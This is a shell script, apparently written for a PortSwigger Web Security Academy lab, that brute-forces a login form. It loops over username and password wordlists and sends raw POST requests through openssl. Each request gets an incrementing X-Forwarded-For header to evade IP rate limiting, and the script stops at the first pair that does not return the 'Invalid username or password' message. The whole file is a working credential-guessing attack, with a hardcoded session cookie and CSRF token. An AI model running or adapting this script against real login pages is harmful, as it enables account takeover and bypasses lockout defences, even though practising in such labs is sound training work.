#!/bin/sh
ContentLength=0;
#username=albuquerque;
i=0;
while read username
do
#	cat passwords.txt | while read password
#	do
#		echo $username, $password;
#		i=$((i+1));
#		echo $i;
#		touch $i;
#	done
	usernames[$i]=$username
#	echo ${usernames[$i]}
	i=$((i+1));
done < usernames.txt

i=0;
while read password
do
	passwords[$i]=$password
	i=$((i+1))
done < passwords.txt
ip=0;
for (( i=0; i < 100; i++ ))
do
	for (( j=0; j < 100; j++ ))
	do
		
		ContentLength=$((57+${#usernames[$i]}+${#passwords[$j]}));
		ip=$((ip+1));
		method="POST /login HTTP/1.1\r\nHost: ac5c1f4e1fa77076808c2545000d00ff.web-security-academy.net\r\nContent-Length: $ContentLength\r\nX-Forwarded-For: $ip\r\nCookie: session=Lz652INS69ji7tC1DFwA7cmbGgJ3hJi1\r\n\r\ncsrf=69I51VSiuaZU09HSOM6EmxCXQckMlcDV&username=${usernames[$i]}&password=${passwords[$j]}";

		#echo $method			
		(echo -e $method) | openssl s_client -ign_eof -connect ac5c1f4e1fa77076808c2545000d00ff.web-security-academy.net:443 | grep "Invalid username or password" > tt;
		#| grep "Invalid username or password" > tt
		echo ${usernames[$i]}, ${passwords[$j]}
		cat tt
		[ ! -s tt ] && echo ${usernames[$i]}, ${passwords[$j]} >> right7 && exit;		
	done
done
